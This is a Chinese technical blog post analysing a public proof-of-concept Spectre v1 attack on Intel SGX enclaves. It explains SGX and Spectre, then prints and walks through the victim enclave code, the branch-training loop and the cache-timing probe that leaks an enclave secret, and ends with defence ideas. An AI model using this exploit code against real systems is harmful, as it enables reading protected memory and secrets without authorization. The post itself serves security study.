---
title: SGX-Spectre侧信道攻击分析
longtitle: 2018-06-23-SGX-Spectre侧信道攻击分析
tags: [SGX, spectre, 漏洞, POC]
excerpt_separator: <!--more-->
key: article-2018-06-23-SGX
---

# 0x01 概要

SGX是Intel提出的一种用于保护用户关键代码和数据的安全技术。由于其信任范围小，很容易受到来自侧信道的攻击，导致SGX的安全性受到挑战。

<!--more-->

2018年初，Jann Horn和Paul Kocher等研究者在Spectre论文中公布了现代CPU都存在可被Spectre攻击的cache和分支预测漏洞，并公布了攻击的POC。该漏洞被收录于CVE-2017-5753和CVE-2017-5715，前者用于边界检测的绕过以对使恶意程序访问其他程序的内存映射，后者用于分支目标的猜测。这一漏洞不依赖具体的硬件环境和操作系统，实现于任何有着加速处理的分支预测技术的现代CPU，因此是一个更为广泛的漏洞。由于该漏洞通过cache和分支预测的方式获取了未经授权的敏感信息，因此可以被视为一种极具威胁的侧信道攻击。

针对上述问题，Imperial College的Large-Scale Data & Systems (LSDS) Group评估了SGX环境下Spectre攻击的情况，并编写了POC代码。本文将从[这份代码](https://github.com/lsds/spectre-attack-sgx)入手，学习研究SGX的基本原理、基于SGX系统的Spectre POC实现方式以及针对这种攻击的防御措施的猜想。


# 0x02 相关技术

## SGX

Intel SGX(Intel Software Guard Extensions)是Intel架构下的一组CPU指令集扩展，用于对软件进行硬件层面的机密性及完整性保护。其保护的机制是将合法的应用程序封装在一个被称为Enclave的容器中，在应用程序的地址空间中划分出一块受保护的内存地址使其不会收到恶意软件的攻击以及特权软件的访问，包括操作系统和VMM(虚拟机监控器)都无法影响被Enclave保护的软件数据以及代码结构。SGX创建的Enclave可以看作一个类似TrustZone(可信空间)的可信执行环境(Trusted Execution Environment)。一个支持SGX指令集的CPU可以创建多个Enclave，并支持并发运行。除了支持内存隔离，SGX技术还支持远程认证与加密功能。

SGX有如下几点关键技术：

### 1、EPC
  
EPC(Enclave Page Cache)是一块用来存放Enclave以及SGX相关数据结构的受保护的物理内存，由MEE(Memory Encryption Engine)提供加密保护。这段内存以页为单位进行管理，由EPCM(Enclave Page Cache Map)对每个EPC页进行访问控制，类似于页表的管理机制。

### 2、Enclave
  
Enclave是用于存放合法应用程序敏感数据以及代码的安全容器，是整个SGX的核心。应用程序可以指定需要保护的数据及代码部分，在Enclave初始化之前这些数据及代码是不需要被检查或者分析，但初始化之后，任何加载到Enclave中的代码及数据需要被度量，最后还需要对Enclave进行完整性验证。Enclave 的主要保护机制主要包括Enclave 内存访问语义的变化与应用程序地址映射的保护。

Enclave创建及其内存布局由SGX内核模块处理。Enclave创建过程中，指令码和数据逐页复制到受保护的Enclave Page Cache（EPC）中，映射的页面及其权限保存在Enclave Page Cache Map（EPCM）。如图所示，Enclave页面权限被管理两次，一次通过OS页面表，一次通过EPCM。从逻辑来看是在保护模式下，在页保护机制上提供了进一步的内存保护。

![Enclave运行过程]({{site.resource}}{{page.longtitle}}/Enclave_resault.png)

### 3、SGX-SDK
  
SGX-SDK是Intel为软件开发者提供的一套软件开发工具包，用于编写并调试基于SGX技术保护的应用程序。软件开发者可以使用其中的API创建Enclave，将应用程序分隔成可信区域与不可信区域，用于保护应用程序中的敏感数据以及代码，不可信区域的应用代码通过执行Ecall用来进入Enclave，可信部分通过执行Ocall离开Enclave，返回不可信环境。

## Spectre

Spectre是一个可以使用户操作系统上的其他程序访问其程序计算机存储器空间中任意位置的漏洞。

Spectre不是单个易于修复的漏洞[3]，而是一类潜在漏洞的总和。它们都利用了一种现代微处理器为降低内存延迟、加快执行速度的常用方法“预测执行”的副作用。具体而言，Spectre着重于分支预测，这是预测执行的一部分。与同时披露的相关漏洞Meltdown[5]不同，Spectre不依赖单个处理器上的内存及系统的特定功能，是一个更为通用的漏洞。

Spectre论文阐述了完成攻击的两个基本要素：

* a) 在现代处理器中的，恶意程序可以通过程序内部的运行操纵分支预测逻辑，使得分支预测命中或者失败的情况可以提前判断。
  
* b) 恶意程序可以可靠地对缓存命中和未命中间的差异进行计时，因此，时间的差别本应是简单的非功能的差别，在实际攻击中却可作为侧信道提取进程的内部工作信息。
  
该论文以一个简单的示例程序和一个在浏览器沙盒中运行的JavaScript片段为基础，将结果与返回导向编程攻击等原理进行综合讨论，指出：在这两种情况下，只需简单使用编译器或现有浏览器中JavaScript引擎来生成可执行代码，利用其中条件分支的预测执行技术，将可以读取整个进程空间的数据。Spectre攻击的基本思想是，在现有的代码中找到执行过程中分支预测可能涉及到的理论上不可访问的数据，操纵处理器，使得预测执行触及该数据并将其装入cache；这时请求访问使用了该cache的非敏感数据，同时对处理器的处理时间进行计时，结果就是访问该cache的数据速度会比没有更快。通过差异分析可以推测上述不可访问数据的具体内容。

Spectre和Meltdown之间的根本区别在于，Spectre使用了更为明显的统计规律，同时尽最大努力以某种方式训练处理器的分支预测机制，并使用现有库中的代码来实现这种攻击。因此，从长远角度看，Spectre比针对特定CPU的Meltdown对现代计算机系统有着更大的威胁。

# 0x03 POC分析与实验

## 3.1 编译过程

从该POC的Makefile文件和SGX给出的官方样例程序分析得出，POC代码的构成分为两个部分，trusted code是受到SGX Enclave保护的代码，其中包含一个secret字符串，是攻击者需要拿到的关键信息；untrusted code是攻击者代码，实现了从Enclave外部获取Enclave内部机密数据的攻击方法。

编译该POC的过程是：由SGX SDK中提供的sgx_edger8r，根据enclave/enclave.edl生成一个向Enclave外部提供调用ENclave内部函数的方法的enclave_u.c文件，该文件将和main/enclave_init.c及enclave_u.o main/main.c共同被gcc编译，生成攻击者的可执行文件；另一方面，同样使用sgx_edger8r，根据enclave/enclave.edl生成一个向Enclave内部提供调用Enclave外部函数的方法的enclave_t.c文件，由于本POC中没有调用相关函数，这一部分只含有SGX本身必须的一些运行函数。该文件和enclave/enclave_attack.c，该文件内涵secret和受攻击的函数，一同被gcc编译为一个enclave可执行文件，并使用SGX SDK提供的sgx_sign程序对该可执行文件进行签名，使其获得SGX相关权限。这样就得到了被攻击者在Enclave中的代码。最后通过链接程序，将两段代码进行链接，使得Enclave外可以调用Enclave内部函数，成功实现整个测试机制。

## 3.2 受害代码分析

受害代码存在于Enclave中，共有两个函数，均是提供给Enclave外部调用的，ecall_get_offset和ecall_victim_function。

### ecall_get_offset

``` C
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

size_t ecall_get_offset() { 
    temp = secret[0]; //Bring secrete into cache.
    return (size_t)(secret-(char*)array1);
}
```

<center><font size="2" color="#595959">代码1 ecall_get_offset</font></center>

首先受害代码初始化了一个全局变量，存入Enclave中，这些变量中，arry1被受害程序使用，作为训练CPU存入cache的被攻击内存；arry2是一个大数组，理论上该数组应由攻击者进行推测和反复尝试得出，在POC中为简单起见，该数组在Enclave外部声明并作为参数传入。

ecall_get_offset向Enclave外返回secret基于arry1的偏移。事实上当攻击者欲访问任意内存时，只需要得知该内存基于arry1的偏移即可。

### ecall_victim_function

``` C
void ecall_victim_function(size_t x, uint8_t * array2, unsigned int * outside_array1_size) {
    //if (x < array1_size) {
    if (x < *outside_array1_size) {
         temp &= array2[array1[x] * 512];
     }
}
```

<center><font size="2" color="#595959">ecall_victim_function</font></center>

ecall_victim_function是真正的受害代码，该函数判断x的值是否越界，并根据arry1[x]的值在arry2中寻址，其中x是传入的参数。这里反复调用该函数会导致arry1[x]的值被存入cache中，为之后的攻击提供了机会。

## 3.3 攻击代码分析

攻击代码有main/main.c和main/enclave_init.c两个文件，其中攻击代码的入口点和攻击方式均在main.c中，enclave_init.c负责Enclave的初始化和销毁。在main.c中的main函数中，程序首先调用相关函数进行初始化操作，接着就进入spectre_main函数执行具体的攻击逻辑。

### spectre_main

``` C
int spectre_main(int argc, char **argv) {
    size_t malicious_x; 
    sgx_status_t ret  = ecall_get_offset(global_eid, &malicious_x); /* default for malicious_x */
    if (ret != SGX_SUCCESS)
            abort();
    int i, score[2], len=40;
    uint8_t value[2];
    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    if (argc == 3) {
        sscanf(argv[1], "%p", (void**)(&malicious_x));
        malicious_x -= (size_t)array1dupe; /* Convert input value into a pointer */
        sscanf(argv[2], "%d", &len);
    }
    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void*)malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");
    }
    return (0);
}
```

<center><font size="2" color="#595959">代码 3 spectre_main</font></center>

该函数执行了以下操作：

* a) 使用ecall_get_offset函数存储在malicious_x变量中，该变量是恶意代码欲攻击的地址和Enclave中arr1的偏移。
  
* b) 判断命令行传参，若有额外参数则使用传入的偏移作为malicious_x攻击偏移，而不使用默认的攻击地址。
  
* c) 写入arry2，防止页表将arry2复制到值为零的页表中。这个页表查询速度比一般的页表快，会导致之后的时间测量失效。
  
* d) 执行主循环，该主循环每次都使malicious_x+1，遍历整个欲查询的内存，将malicious_x作为参数传入攻击函数readMemoryByte中，同时也将value[2]和score[2]两个数组清零后作为参数传入该函数，分别用于存放评估时间测量最优秀的两个猜测结果和其获得的评估分数。
  
* e) 打印出对对应偏移的字节猜测，同时给出评估结果为第二的结果备选。若只有一个结果或score[0]和score[1]差距过大，则返回success，否则返回unclear。
  
### readMemoryByte

readMemoryByte由一个1000次的循环组成，由这1000次循环的结果猜测最有可能的结果。在该循环中，代码由三部分组成，作用是训练分支预测、cache结果分析猜测、高分结果选取。

``` C
for (tries = 999; tries > 0; tries--) {
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
    _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
        _mm_clflush(&array1_size);
        volatile int z;
        for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
        
        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
        /* Avoid jumps in case those tip off the branch predictor */
        x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
        x = training_x ^ (x & (malicious_x ^ training_x));
        
        /* Call the victim! */ 
                sgx_status_t ret = SGX_ERROR_UNEXPECTED;
        ret = ecall_victim_function(global_eid, x, array2, &array1_size);
            if (ret != SGX_SUCCESS)
                abort();
    }
```
<center><font size="2" color="#595959">代码 4分支训练代码</font></center>

如上的分支训练代码中，执行了以下操作：

* a) 进入一个30次的循环，设置一个循环次数计数器。
  
* b) 使用_mm_clflush(&array2[i * 512])函数刷新缓存，防止上一次的查询训练影响本次预测。
  
* c) 使用位移的方式设置偏移。在这个循环中，每6次执行受害函数，最后一次将使用malicious_x的值设为x进行查询，而前5次将一个正常值设为x进行查询。由于不希望这个循环的结果干扰分支预测，次操作完全由位操作执行，即不执行判断。
  
* d) 调用在Enclave中的受害函数，传入设置好的x。假设在没有分支预测时，ecall_victim_function将判断x是否越界arry1，若越界，则将不给予这次内存偏移访问。然而，在攻击程序的训练下，由于 CPU 得知大部分情况下都可以通过分支判断，CPU被训练为先读取偏移处的内存值（ arry2[arry1[x]] ），同时进行分支判断。与此同时，cache机制开始工作：该机制发现有一处内存（即 arry2[arry1[x]] ）正在被反复读，便将该值加入 cache 中，以期加快了其读取的速度。
  
* e) 在最后一次调用时，arry2[arry1[malicious_x]]被读入cache中。
* 
经过以上操作，CPU已将一块内存保存至cache中，这将被之后的分析代码利用。

``` C
/* Time reads. Order is lightly mixed up to prevent stride prediction */
for (i = 0; i < 256; i++) {
    mix_i = ((i * 167) + 13) & 255;
    addr = &array2[mix_i * 512];
    time1 = __rdtscp(&junk); /* READ TIMER */
    junk = *addr; /* MEMORY ACCESS TO TIME */
    time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
    //if (time2 <= CACHE_HIT_THRESHOLD)
    if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1dupe[tries % array1_size])
    {
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }
}
```

<center><font size="2" color="#595959">代码 5cache结果分析猜测</font></center>

由于cache已经保存了敏感内存的值，接下来即需一定的手段进行推测。上述代码则将执行这一推测。这一过程如下：

* a) 执行一个256次的循环，遍历一个字节可能的取值。
  
* b) 将取值顺序打乱，防止CPU的分支预测生效（实际实验中发现，不打乱不会影响结果）。取值为mix_i，即一个现在评估的字节值。
  
* c) 记录开始取值的时间戳。读取arry2[mix_i]的值。计算时间戳的差。
  
* d) 由于arry2[arry1[x]]已经被存储在cache中，则当mix_i==arry1[x]时，查询所用的时间将远远小于mix_i!=arry1[x]的情况。该时间可以通过测试得出，POC中将该时间设置为80ns。将符合这样条件的mix_i所对应的result值+1分。经过1000次实验，在cache中的arry2[arry1[x]]所对应的mix_i得分将远高于不再cache中的结果。由此得知，得分越高，说明该值曾多次被装入cache中。

### 高分结果获取

用遍历的方法在1000次测试中选出得分最高的两个猜测结果作为结果返回给spectre_main。得分最高，说明该结果在1000次实验每次中都是查询最快的一个结果，这说明该结果曾被多次装入cache中，即Spectre攻击的内存。

## 测试结果

测试平台：Ubuntu18.04 64位

![测试结果]({{site.resource}}{{page.longtitle}}/test_resault.png)

测试结果如上所示。经过8.32秒的运行后，POC完美推测出全部40个字符。在调整了评分时间的大小后，second best越来越少，预测结果越来越精确，success数量也越来越多。可以猜测，cache读取时间与具体的机器有关，应该根据具体的攻击设备设定该数值。过大则无法筛选cache值，过小则无法筛选出cache读取的预测值。

# 0x04防御思路

Spectre攻击是对现代计算机体系结构发起的一次攻击，很难从根本上解决这一问题，因为现代计算机很大程度上依赖于分支预测，对分支预测系统的限制或改变将大幅度降低现代计算机的计算水平。同样，限制cache的性能也是不可以接受的选择，这同样将大幅度影响计算性能。

若单由这一POC入手，解决方法较为简单，即检查程序中是否有符合向arry2这样的大数组的存在，若存在这样的数组，则说明当前程序可能已经遭受Spectre攻击。然而，当这一攻击在未来发生变种时，同样的防御策略将很难奏效。

SGX安全防护的薄弱点在于其可信面过小，只保护了关键代码和内存，容易受到处于Enclave外的攻击。若使用大范围的可信设施，如TPM2.0，保证整个计算机的可信，则可以大程度上遏制Spectre代码对于程序的更改和攻击。

# 0x05总结

本文由SGX-Spectre POC入手，分析了SGX环境下Spectre攻击的运行情况，解释Spectre在SGX下的运行原理，通过实验证明了SGX并不能阻止Spectre攻击获取SGX内部的安全信息。

Spectre是SGX侧信道的一种，也是目前威胁最大的一种，可以完全读取计算机上的任意内存，对数据安全造成了极大的隐患。但仍有一些其他的针对SGX的侧信道需要发掘和进行针对性的防御，这些侧信道获取或修改的数据范围可能小于Spectre攻击的攻击范围，但其威胁程度仍不可小觑。

# 0x06参考资料

* [1] Xiao, Y., Li, M., Chen, S., & Zhang, Y. (2017, October). Stacco: Differentially analyzing side-channel traces for detecting SSL/TLS vulnerabilities in secure enclaves. In Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security (pp. 859-874). ACM.
  
* [2] Schwarz, M., Weiser, S., Gruss, D., Maurice, C., & Mangard, S. (2017, July). Malware guard extension: Using SGX to conceal cache attacks. In International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment (pp. 3-24). Springer, Cham.
  
* [3] Kocher, P., Genkin, D., Gruss, D., Haas, W., Hamburg, M., Lipp, M., ... & Yarom, Y. (2018). Spectre Attacks: Exploiting Speculative Execution. arXiv preprint arXiv:1801.01203.
  
* [4] lsds/spectre-attack-sgx. (2018). Retrieved from https://github.com/lsds/spectre-attack-sgx
  
* [5] Lipp, M., Schwarz, M., Gruss, D., Prescher, T., Haas, W., Mangard, S., ... & Hamburg, M. (2018). Meltdown. arXiv preprint arXiv:1801.01207.